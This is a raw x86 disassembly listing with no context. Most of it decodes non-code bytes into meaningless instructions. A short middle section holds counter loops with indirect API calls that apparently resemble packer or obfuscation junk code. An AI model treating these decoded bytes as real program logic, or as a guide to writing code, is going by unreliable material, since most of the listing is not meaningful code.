  40a1e5:	mov    bh,0x22
  40a1e7:	xchg   esi,eax
  40a1e8:	or     eax,eax
  40a1ea:	xchg   ebp,eax
  40a1eb:	outs   dx,BYTE PTR ds:[esi]
  40a1ec:	repz inc esi
  40a1ee:	cmp    BYTE PTR [eax],0xd7
  40a1f1:	pop    ds
  40a1f2:	inc    esi
  40a1f3:	inc    edx
  40a1f4:	lods   eax,DWORD PTR ds:[esi]
  40a1f5:	sbb    al,0x17
  40a1f7:	std    
  40a1f8:	(bad)  
  40a1f9:	(bad)  
  40a1fa:	out    0xed,eax
  40a1fc:	xchg   BYTE PTR [edi-0x11],dh
  40a1ff:	aam    0x97
  40a201:	sbb    ebp,0x6b0a04de
  40a207:	pop    ds
  40a208:	push   esi
  40a209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a20a:	jns    0x40a216
  40a20c:	mov    bh,0xb7
  40a20e:	data16 cli 
  40a210:	fcomip st,st(5)
  40a212:	cld    
  40a213:	mov    ebp,0x48f88b84
  40a218:	ja     0x40a275
  40a21a:	sub    DWORD PTR [edi+0x6c],ecx
  40a21d:	xor    DWORD PTR [eax-0x62],esp
  40a220:	in     al,dx
  40a221:	int3   
  40a222:	add    BYTE PTR [edi],al
  40a224:	adc    al,BYTE PTR [ebp+0x4]
  40a227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a228:	jmp    DWORD PTR [edi+ebp*1-0x76e121db]
  40a22f:	and    edi,esp
  40a231:	into   
  40a232:	sub    BYTE PTR [edi+edx*4],cl
  40a235:	or     BYTE PTR [eax+0x665ac65f],ah
  40a23b:	add    bl,bl
  40a23d:	mov    ds:0x937fad7a,eax
  40a242:	ins    BYTE PTR es:[edi],dx
  40a243:	mov    edx,0x71419520
  40a248:	fyl2xp1 
  40a24a:	sbb    BYTE PTR [ebx-0x18e1d811],al
  40a250:	mov    esi,0xc7eb9fb6
  40a255:	fst    QWORD PTR [ebp+0x5d]
  40a258:	jmp    0x970a4f0a
  40a25d:	dec    ecx
  40a25e:	clc    
  40a25f:	or     eax,0xff4b8bc4
  40a264:	shl    BYTE PTR [edi+0x2babefe0],1
  40a26a:	sbb    ebx,DWORD PTR [esi-0x2f]
  40a26d:	sahf   
  40a26e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a26f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40a271:	add    eax,0x4b707bfc
  40a276:	fstp   st(7)
  40a278:	xchg   ecx,eax
  40a279:	in     al,dx
  40a27a:	mov    ecx,0x1dd1208f
  40a27f:	std    
  40a280:	adc    DWORD PTR [edi-0x28],edi
  40a283:	and    eax,0x31314f70
  40a288:	(bad)  
  40a289:	jle    0x40a279
  40a28b:	out    0x80,al
  40a28d:	sbb    al,0x6c
  40a28f:	sahf   
  40a290:	es outs dx,DWORD PTR ss:[esi]
  40a293:	push   ecx
  40a294:	adc    BYTE PTR [edi],0xbf
  40a297:	jg     0x40a306
  40a299:	test   al,0x95
  40a29b:	fsub   st(3),st
  40a29d:	mov    WORD PTR [edi+eiz*8-0x77],cs
  40a2a1:	xchg   BYTE PTR [ecx+0x7e1613ae],cl
  40a2a7:	add    ebp,DWORD PTR [esi+ebx*1]
  40a2aa:	rol    BYTE PTR [edx+0x20],cl
  40a2ad:	sub    eax,0x4aafdf36
  40a2b2:	push   ecx
  40a2b3:	cmp    DWORD PTR [eax+esi*1-0x68],0x78
  40a2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2b9:	pop    edi
  40a2ba:	rcr    DWORD PTR [ebp-0x31],0xcf
  40a2be:	ins    DWORD PTR es:[edi],dx
  40a2bf:	nop
  40a2c0:	or     dl,BYTE PTR [ecx]
  40a2c2:	inc    edx
  40a2c3:	sub    eax,0x2707e80
  40a2c8:	pextrw ebp,mm1,0xc8
  40a2cc:	fdivr  st(3),st
  40a2ce:	jge    0x40a348
  40a2d0:	in     al,0x34
  40a2d2:	(bad)  
  40a2d3:	push   edx
  40a2d4:	faddp  st(2),st
  40a2d6:	and    ecx,edi
  40a2d8:	inc    edx
  40a2d9:	(bad)
  40a2dd:	cli    
  40a2de:	jecxz  0x40a303
  40a2e0:	xchg   esp,eax
  40a2e1:	jns    0x40a2ce
  40a2e3:	pop    ss
  40a2e4:	das    
  40a2e5:	and    esi,DWORD PTR [ecx]
  40a2e7:	loopne 0x40a2ec
  40a2e9:	out    dx,al
  40a2ea:	ja     0x40a2b3
  40a2ec:	mov    ds:0x5cfc42af,eax
  40a2f1:	inc    esi
  40a2f2:	mov    ch,0x67
  40a2f4:	enter  0x225,0x10
  40a2f8:	hlt    
  40a2f9:	fadd   QWORD PTR [ecx-0x407c5b2a]
  40a2ff:	loop   0x40a314
  40a301:	loopne 0x40a361
  40a303:	pop    ds
  40a304:	or     eax,0xf46868f4
  40a309:	(bad)  
  40a30b:	std    
  40a30c:	mov    DWORD PTR [ebx],0x5f98ba8a
  40a312:	ret    
  40a313:	out    dx,al
  40a314:	mov    al,ds:0xb159550c
  40a319:	inc    edx
  40a31a:	pop    edx
  40a31b:	mov    dh,0x38
  40a31d:	adc    BYTE PTR [ecx-0x73],cl
  40a320:	lods   al,BYTE PTR ds:[esi]
  40a321:	xchg   ecx,eax
  40a322:	mov    ebp,0xcc2ec886
  40a327:	fcomp  QWORD PTR [ebx-0x2a943cf0]
  40a32d:	call   0xd13d:0xf83c8e0f
  40a334:	dec    ecx
  40a335:	push   esp
  40a336:	or     eax,0x1f4d62a2
  40a33b:	stos   DWORD PTR es:[edi],eax
  40a33c:	push   es
  40a33d:	iret   
  40a33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a33f:	xor    eax,edx
  40a341:	ret    
  40a342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a343:	scas   eax,DWORD PTR es:[edi]
  40a344:	push   ds
  40a345:	lods   eax,DWORD PTR ds:[esi]
  40a346:	jb     0x40a370
  40a348:	call   0x44fe:0xa4dc59e2
  40a34f:	je     0x40a381
  40a351:	jno    0x40a2f3
  40a353:	fnstcw WORD PTR [eax+0x2c798f2e]
  40a359:	mov    eax,0x1c347b91
  40a35f:	(bad)  
  40a360:	lods   eax,DWORD PTR ds:[esi]
  40a361:	mov    ecx,0xe00ef284
  40a366:	cmp    DWORD PTR [ebp-0x21b265db],esi
  40a36c:	fst    QWORD PTR [eax+0x3bf7f961]
  40a372:	into   
  40a373:	test   eax,0x64717797
  40a378:	cmp    dh,BYTE PTR [edi-0x64d73290]
  40a37e:	sub    DWORD PTR [esi-0x4e2d0b18],esp
  40a384:	lds    esi,FWORD PTR [esi]
  40a386:	clc    
  40a387:	loop   0x40a315
  40a389:	aas    
  40a38a:	(bad)  
  40a38b:	int    0x9e
  40a38d:	movq   mm4,QWORD PTR [edx]
  40a390:	lods   al,BYTE PTR ds:[esi]
  40a391:	or     al,0x5f
  40a393:	imul   ecx,DWORD PTR [esi],0x3dfd76e5
  40a399:	int    0xed
  40a39b:	(bad)  
  40a39c:	out    0xc8,eax
  40a39e:	fcomip st,st(0)
  40a3a0:	adc    bl,BYTE PTR [ecx]
  40a3a2:	xchg   esi,eax
  40a3a3:	test   BYTE PTR [ebx-0x67209912],bh
  40a3a9:	ss loop 0x40a3b0
  40a3ac:	rol    BYTE PTR [edx-0x306cf119],cl
  40a3b2:	jne    0x40a3d9
  40a3b4:	mov    ds:0xc0356827,eax
  40a3b9:	js     0x40a428
  40a3bb:	xor    al,0xba
  40a3bd:	xchg   ebx,eax
  40a3be:	sahf   
  40a3bf:	pushf  
  40a3c0:	mov    ah,0xef
  40a3c2:	mov    BYTE PTR [esi+edx*2],bh
  40a3c5:	push   eax
  40a3c6:	mov    DWORD PTR [esi],0x38c42a9c
  40a3cc:	les    eax,FWORD PTR [ebx]
  40a3ce:	mov    ecx,0x2ae2807
  40a3d3:	test   eax,0x5df92435
  40a3d8:	repnz mov esi,0x925d70e5
  40a3de:	adc    eax,DWORD PTR [eax+0x79]
  40a3e1:	sti    
  40a3e2:	(bad)  
  40a3e3:	rcl    DWORD PTR [esi-0x17],1
  40a3e6:	popa   
  40a3e7:	jbe    0x40a45f
  40a3e9:	pop    edi
  40a3ea:	pop    ebp
  40a3eb:	dec    esp
  40a3ec:	add    esi,DWORD PTR [eax]
  40a3ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3ef:	(bad)  
  40a3f0:	dec    ecx
  40a3f1:	xchg   DWORD PTR [esi],ecx
  40a3f3:	popa   
  40a3f4:	xchg   DWORD PTR [ebp-0x38813943],ebp
  40a3fa:	inc    ebp
  40a3fb:	aam    0x3b
  40a3fd:	test   DWORD PTR [eax+edi*8+0x3ad045c7],ebx
  40a404:	test   DWORD PTR [eax+edi*8+0x45c7ff0b],ebx
  40a40b:	int3   
  40a40c:	cmp    eax,0x1bf89c85
  40a411:	cmp    eax,0x434587
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x4344f3,0x13
  40a427:	cmp    DWORD PTR ds:0x4344f3,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x4344f3,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43460f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x4344f3
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x4344f3,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x4345fb,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x4345fb
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x4345fb,edx
  40a477:	cmp    DWORD PTR ds:0x4345fb,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x4345b7
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x4348a7
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x4345fb,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x43454b,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434593,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x434553,0x43454f
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x434577,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x434577,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434603,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x4345cb,0x43457b
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x43454f,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x43454f,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x4344f3,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x4344fb,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x4345fb,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434617
  40a564:	mov    edx,DWORD PTR ds:0x434627
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x43453f,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x43453f
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x43453f,ebx
  40a58c:	cmp    DWORD PTR ds:0x43453f,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x43453f,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x43453f
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x43453f,ebx
  40a5bc:	cmp    DWORD PTR ds:0x43453f,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x43457f
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x434537,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x43454b,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x43454b,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x43454b,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x43454b
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x43454b,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x4345c7,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x43453f,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x4345bf
  40a648:	add    DWORD PTR ds:0x434613,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x43457f,0x434607
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	mov    dl,0x64
  40a66e:	xor    eax,0x7ef2faaf
  40a673:	jle    0x40a6e5
  40a675:	jns    0x40a6f5
  40a677:	jle    0x40a643
  40a679:	enter  0x38d7,0xfd
  40a67d:	xchg   ebx,eax
  40a67e:	sahf   
  40a67f:	and    DWORD PTR [ebp-0x46],edi
  40a682:	inc    edi
  40a683:	push   ebp
  40a684:	dec    edx
  40a685:	stc    
  40a686:	push   ds
  40a687:	int3   
  40a688:	stos   DWORD PTR es:[edi],eax
  40a689:	fisub  DWORD PTR [ecx-0xdeed06b]
  40a68f:	sub    dl,bh
  40a691:	mov    WORD PTR [ebp-0xccb76c8],?
  40a697:	mov    al,ds:0xb8c8c612
  40a69c:	and    ebp,DWORD PTR [eax]
  40a69e:	aam    0xd
  40a6a0:	in     eax,0xff
  40a6a2:	cmp    esi,ebp
  40a6a4:	dec    edi
  40a6a5:	mov    ebp,0x24833825
  40a6aa:	not    BYTE PTR ds:0xcde48ee5
  40a6b0:	inc    esi
  40a6b1:	int    0xb1
  40a6b3:	fsub   st(1),st
  40a6b5:	outs   dx,DWORD PTR ds:[esi]
  40a6b6:	adc    al,0xdd
  40a6b8:	sahf   
  40a6b9:	adc    dh,BYTE PTR [ecx+0x65]
  40a6bc:	arpl   WORD PTR [ebx-0x15294677],ax
  40a6c2:	cmp    al,0xc5
  40a6c4:	add    BYTE PTR [ebp+0x3d05ed3d],al
  40a6ca:	cld    
  40a6cb:	(bad)
  40a6ce:	and    al,0x3
  40a6d0:	outs   dx,DWORD PTR ds:[esi]
  40a6d1:	mov    bh,0xb0
  40a6d3:	push   ecx
  40a6d4:	mov    ebx,0xa8a5de75
  40a6d9:	xchg   ebp,eax
  40a6da:	retf   
  40a6db:	push   cs
  40a6dc:	hlt    
  40a6dd:	dec    esi
  40a6de:	es int3 
  40a6e0:	pop    ebx
  40a6e1:	mov    cl,0xec
  40a6e3:	lods   al,BYTE PTR ds:[esi]
  40a6e4:	xchg   ecx,eax
  40a6e5:	pop    ebx
  40a6e6:	sub    bh,cl
  40a6e8:	fs jo  0x40a691
  40a6eb:	mov    edx,0xc149ae3e
  40a6f0:	add    cl,ah
  40a6f2:	arpl   WORD PTR ds:0x21094f65,si
  40a6f8:	xor    sp,di
  40a6fb:	test   DWORD PTR [edi+0x6ae219bf],0x946dffde
  40a705:	jg     0x40a700
  40a707:	cmp    DWORD PTR [ecx+0x3d],edx
  40a70a:	test   eax,0xbae0b108
  40a70f:	lods   eax,DWORD PTR ds:[esi]
  40a710:	inc    esp
  40a711:	jo     0x40a693
  40a713:	fisubr DWORD PTR [eax]
  40a715:	cmp    ebx,ebx
  40a717:	cmc    
  40a718:	popa   
  40a719:	sub    BYTE PTR [edx+edi*1-0x170e0458],ch
  40a720:	arpl   WORD PTR [esi],di
  40a722:	jmp    0x4f6d:0x9b747a1e
  40a729:	or     edi,DWORD PTR [ebx]
  40a72b:	call   0x8b2:0x7ade272
  40a732:	aas    
  40a733:	(bad)  
  40a734:	cmp    DWORD PTR [edi+esi*8-0x3134d9bb],ecx
  40a73b:	sbb    eax,ebx
  40a73d:	aam    0x11
  40a73f:	dec    ebx
  40a740:	rol    DWORD PTR [edi],cl
  40a742:	push   ebp
  40a743:	pop    eax
  40a744:	add    al,0xac
  40a746:	pop    esp
  40a747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a748:	mov    BYTE PTR ds:0x4b93a15d,ch
  40a74e:	(bad)  
  40a74f:	xor    bh,ah
  40a751:	mov    ah,0xaa
  40a753:	fcom   DWORD PTR [esp+ebp*8+0x71]
  40a757:	ret    0xca0
  40a75a:	sub    al,0x47
  40a75c:	push   ebp
  40a75d:	ins    BYTE PTR es:[edi],dx
  40a75e:	(bad)  
  40a761:	sbb    BYTE PTR [edi+0x174689c],0x13
  40a768:	push   eax
  40a769:	outs   dx,BYTE PTR ds:[esi]
  40a76a:	mov    al,ds:0x6383fd5
  40a76f:	push   ecx
  40a770:	dec    ebx
  40a771:	fld    TBYTE PTR [edx]
  40a773:	pop    eax
  40a774:	shl    esp,1
  40a776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a777:	and    BYTE PTR [ecx+edx*4],ch
  40a77a:	pop    ebp
  40a77b:	push   cs
  40a77c:	and    BYTE PTR [ecx+0x36011e8d],al
  40a782:	push   edx
  40a784:	push   esi
  40a785:	fwait
  40a786:	mov    ebp,0xe8192344
  40a78b:	pop    ss
  40a78c:	retf   
  40a78d:	push   0xac6fb01e
  40a792:	es std 
  40a794:	jmp    0x5aea:0x431cae42
  40a79b:	pushf  
  40a79c:	and    al,0x2a
  40a79e:	or     al,BYTE PTR [edi]
  40a7a0:	(bad)
  40a7a3:	push   edx
  40a7a4:	and    eax,0x7f67e12c
  40a7a9:	gs cwde 
  40a7ab:	pop    ds
  40a7ac:	pop    ss
  40a7ad:	outs   dx,BYTE PTR ds:[esi]
  40a7ae:	stc    
  40a7af:	or     BYTE PTR [ebp+0x6f],dl
  40a7b2:	aas    
  40a7b3:	aaa    
  40a7b4:	das    
  40a7b5:	retf   0xc75c
  40a7b8:	sub    DWORD PTR ds:[edx],ebp
  40a7bb:	mov    ds:0xec87b77a,al
  40a7c0:	daa    
  40a7c1:	aam    0xe0
  40a7c3:	cmp    eax,0x9a4c63d9
  40a7c8:	std    
  40a7c9:	aaa    
  40a7ca:	test   eax,0x6b9700a8
  40a7cf:	in     eax,0xe8
  40a7d1:	(bad)  
  40a7d2:	jle    0x40a84d
  40a7d4:	vmulsd xmm3,xmm6,QWORD PTR [ebp+0x6d]
  40a7d9:	mov    dl,0x75
  40a7db:	lods   eax,DWORD PTR ds:[esi]
  40a7dc:	das    
  40a7dd:	and    BYTE PTR [ecx-0x5c],ch
  40a7e0:	pop    esi
  40a7e1:	pop    ebp
  40a7e2:	sbb    al,0xad
  40a7e4:	inc    eax
  40a7e5:	jns    0x40a858
  40a7e7:	ds sub dl,dl
  40a7ea:	push   0xd49cf97a
  40a7ef:	imul   ecx,DWORD PTR [esi],0xffffffe9
  40a7f2:	cmc    
  40a7f3:	mov    ds:0x62eb3a19,eax
  40a7f8:	outs   dx,DWORD PTR cs:[esi]
  40a7fa:	or     BYTE PTR [esi+0x7c],0x5
  40a7fe:	icebp  
  40a7ff:	test   edi,ecx
  40a801:	les    ebp,FWORD PTR [edi-0x17]
  40a804:	xor    cl,BYTE PTR [ebx-0x441da930]
  40a80a:	xor    eax,0xfffffffc
  40a80d:	pop    es
  40a80e:	sti    
  40a80f:	and    ecx,edi
  40a811:	pop    es
  40a812:	mov    bl,0x6b
  40a814:	xor    al,0x5f
  40a816:	adc    eax,0xfcaafe43
  40a81b:	mov    eax,ebx
  40a81d:	scas   al,BYTE PTR es:[edi]
  40a81e:	fstp   DWORD PTR [ebx+0x52ac971]
  40a824:	cld    
  40a825:	sti    
  40a826:	mov    ah,0x75
  40a828:	dec    ebx
  40a829:	mov    edi,0x7edb91cd
  40a82e:	mov    ?,esi
  40a830:	fiadd  WORD PTR [ebp+0x41]
  40a833:	inc    esi
  40a834:	or     DWORD PTR [edx],esp
  40a836:	sub    eax,0xb8529f1f
  40a83b:	sahf   
  40a83c:	sti    
  40a83d:	mov    esi,0xded4e96f
  40a842:	inc    esp
  40a843:	loop   0x40a8be
  40a845:	(bad)  
  40a846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a847:	mov    edi,0x49f74dfa
  40a84c:	in     eax,dx
  40a84d:	jge    0x40a8a2
  40a84f:	mov    al,ds:0x9ba7dd03
  40a854:	or     BYTE PTR [edi+0x3f],cl
  40a857:	mov    esp,0xbcec6a6d
  40a85c:	loop   0x40a886
  40a85e:	cmp    al,0x5c
  40a860:	sbb    eax,0xe518f19c
  40a865:	sub    esi,edx
  40a867:	or     al,0x9f
  40a869:	shl    BYTE PTR ds:0xa102b063,0xf7
  40a870:	inc    esp
  40a871:	pop    eax
  40a872:	stos   DWORD PTR es:[edi],eax
  40a873:	inc    BYTE PTR [eax+0x5f]
  40a876:	sub    DWORD PTR [ebx],esp
  40a878:	cmc    
  40a879:	mov    edx,0x45eeef27
  40a87e:	mov    ebp,0x5dc2ba93
  40a883:	fnstcw WORD PTR [esi-0x45]
  40a886:	mov    eax,ds:0xce25ff63
  40a88b:	rcr    DWORD PTR [edx-0x4],1
  40a88e:	and    al,0xcf
  40a890:	loop   0x40a8b9
  40a892:	data16 sahf 
  40a894:	inc    ecx
  40a895:	push   esp
  40a896:	fild   QWORD PTR [edi]
  40a898:	std    
  40a899:	(bad)  
  40a89a:	fnstcw WORD PTR [esi]
  40a89c:	mov    WORD PTR [ebx+0x7408f993],es
  40a8a2:	shl    eax,cl
  40a8a4:	mov    eax,ds:0xd9efa2fc
  40a8a9:	lock dec ebx
  40a8ab:	inc    esi
  40a8ac:	stos   DWORD PTR es:[edi],eax
  40a8ad:	bound  ebp,QWORD PTR [edi+0x5b]
  40a8b0:	mov    eax,0x463a7b10
  40a8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8b6:	test   BYTE PTR [edx],0xe
  40a8b9:	pop    edx
  40a8ba:	inc    edx
  40a8bb:	je     0x40a939
  40a8bd:	and    BYTE PTR ds:0x6f3cb7c1,dh
  40a8c3:	jp     0x40a88f
  40a8c5:	cmp    BYTE PTR [ebp+ebx*1+0x27],0x1c
  40a8ca:	or     ch,BYTE PTR [edi+ecx*1]
  40a8cd:	leave  
  40a8ce:	mov    edi,esi
  40a8d0:	fisubr DWORD PTR [esi+esi*2]
  40a8d3:	shr    BYTE PTR [edi],0x6d
  40a8d6:	cmp    ebx,DWORD PTR [esi-0x6e36a976]
  40a8dc:	cmc    
  40a8dd:	sub    dl,BYTE PTR [ecx+0xf99ef48]
  40a8e3:	repz sti 
  40a8e5:	pop    eax
  40a8e6:	xchg   edi,eax
  40a8e7:	leave  
  40a8e8:	mov    WORD PTR ss:[ebx+0x65ae536],es
  40a8ef:	loope  0x40a879
  40a8f1:	push   ss
  40a8f2:	sub    eax,0x18f7e72d
  40a8f7:	dec    ebp
  40a8f8:	outs   dx,DWORD PTR ds:[esi]
  40a8f9:	stos   DWORD PTR es:[edi],eax
  40a8fa:	mov    edx,0x2e7239e8
  40a8ff:	mov    esi,0x7db0f737
  40a904:	fmul   QWORD PTR [esi-0x3a]
  40a907:	xchg   esp,eax
  40a908:	xchg   ecx,eax
  40a909:	add    esp,DWORD PTR [ebx]
  40a90b:	outs   dx,DWORD PTR ds:[esi]
  40a90c:	call   0x3db1:0xe8a956b5
  40a913:	and    BYTE PTR [ebp+0x8926a4],0x2b
  40a91a:	push   edx
  40a91b:	out    dx,eax
  40a91c:	(bad)
  40a91f:	lock sbb ch,BYTE PTR [edi-0x5c96c455]
  40a926:	mov    al,0xb8
  40a928:	fwait
  40a929:	sub    eax,0x4b842e66
  40a92e:	(bad)  
  40a92f:	(bad)  
  40a930:	sbb    DWORD PTR [esi+0x7818b1ee],esp
  40a936:	mov    ds:0x8c0026d2,al
  40a93b:	add    ebx,DWORD PTR [edi-0x78ed2674]
  40a941:	adc    DWORD PTR [edx+ecx*8],esp
  40a944:	push   ebp
  40a945:	mov    esi,ebx
  40a947:	das    
  40a948:	xchg   bl,al
  40a94a:	(bad)  
  40a94b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a94c:	in     al,0x35
  40a94e:	ins    BYTE PTR es:[edi],dx
  40a94f:	mov    ecx,0x7ea0999d
  40a954:	mov    dh,BYTE PTR [ebp+0x10b56dc8]
  40a95a:	jle    0x40a8e9
  40a95c:	dec    ebp
  40a95d:	or     esp,DWORD PTR cs:[ecx-0x8]
  40a961:	fst    QWORD PTR [esp+eax*2+0x29]
  40a965:	and    esi,DWORD PTR [ebp-0x39]
  40a968:	xor    al,0x97
  40a96a:	(bad)  
  40a96b:	retf   
  40a96c:	adc    al,0xcc
  40a96e:	shl    BYTE PTR ds:0xf248c491,0xfc
  40a975:	fcmovnbe st,st(5)
  40a977:	xchg   esp,eax
  40a978:	int    0xa5
  40a97a:	sbb    al,0x8b
  40a97c:	add    eax,0xa3975a11
  40a981:	in     al,0xd4
  40a983:	inc    edx
  40a984:	mov    BYTE PTR [ebx+0x6c16a03f],ch
  40a98a:	addr16 jg 0x40a934
  40a98d:	mov    al,ds:0xf303440d
  40a992:	lods   al,BYTE PTR ds:[esi]
  40a993:	adc    eax,DWORD PTR [eax+ecx*2+0x76ef178e]
  40a99a:	(bad)  
  40a99b:	push   cs
  40a99c:	clc    
  40a99d:	pop    esi
  40a99e:	adc    al,0xd9
  40a9a0:	les    ebp,FWORD PTR [ebp-0x49]
  40a9a3:	bound  ecx,QWORD PTR [ebp+0x16]
  40a9a6:	jae    0x40a986
  40a9a8:	ja     0x40a99b
  40a9aa:	int3   
  40a9ab:	leave  
  40a9ac:	jmp    0x40a977
  40a9ae:	xchg   edi,eax
  40a9af:	push   ds
  40a9b0:	xchg   edx,eax
  40a9b1:	push   ebp
  40a9b2:	inc    eax
  40a9b3:	xchg   esp,eax
  40a9b4:	xor    al,0x1c
  40a9b6:	sub    eax,0x1ff69c9d
  40a9bb:	in     al,dx
  40a9bc:	outs   dx,BYTE PTR ds:[esi]
  40a9bd:	and    BYTE PTR [ebx],0x75
  40a9c0:	add    BYTE PTR [eax-0x2f],bh
  40a9c3:	js     0x40a994
  40a9c5:	std    
  40a9c6:	sbb    BYTE PTR [ebp+0x5fdd57a9],bl
  40a9cc:	push   esp
  40a9cd:	cld    
  40a9ce:	out    dx,al
  40a9cf:	retf   0x2cd4
  40a9d2:	ss xchg edi,eax
  40a9d4:	hlt    
  40a9d5:	add    DWORD PTR [ebx+eax*1],0xffffff81
  40a9d9:	cmp    DWORD PTR [eax],ebx
  40a9db:	add    eax,0xe5e90d41
  40a9e0:	jnp    0x40a979
  40a9e2:	repnz aas 
  40a9e4:	jae    0x40aa44
  40a9e6:	out    dx,eax
  40a9e7:	lahf   
  40a9e8:	outs   dx,BYTE PTR ds:[esi]
  40a9e9:	mov    eax,DWORD PTR [eax]
  40a9eb:	sar    DWORD PTR [ecx+0x10],cl
  40a9ee:	push   esi
  40a9ef:	in     eax,0xc1
  40a9f1:	xor    eax,0xf3a517
  40a9f6:	and    dh,BYTE PTR [ecx-0xb]
  40a9f9:	sub    esi,DWORD PTR [edx+0x6d]
  40a9fc:	pop    edi
  40a9fd:	inc    eax
  40a9fe:	lds    eax,FWORD PTR [ecx-0x6a80e653]
  40aa04:	inc    edx
  40aa05:	push   esp
  40aa06:	ret    
  40aa07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa08:	aas    
  40aa09:	jmp    0x40a9f1
  40aa0b:	ins    DWORD PTR es:[edi],dx
  40aa0c:	cmp    al,0x3
  40aa0e:	lock xchg BYTE PTR [esi+edx*8-0x7bad3e44],bh
  40aa16:	pop    fs
  40aa18:	cmp    bh,bl
  40aa1a:	scas   eax,DWORD PTR es:[edi]
  40aa1b:	xchg   edi,eax
  40aa1c:	push   esi
  40aa1d:	dec    edi
  40aa1e:	sbb    dl,BYTE PTR [ecx]
  40aa20:	shl    DWORD PTR [edx],cl
  40aa22:	in     eax,0x5d
  40aa24:	sti    
  40aa25:	or     DWORD PTR [ebx],0x8a54973c
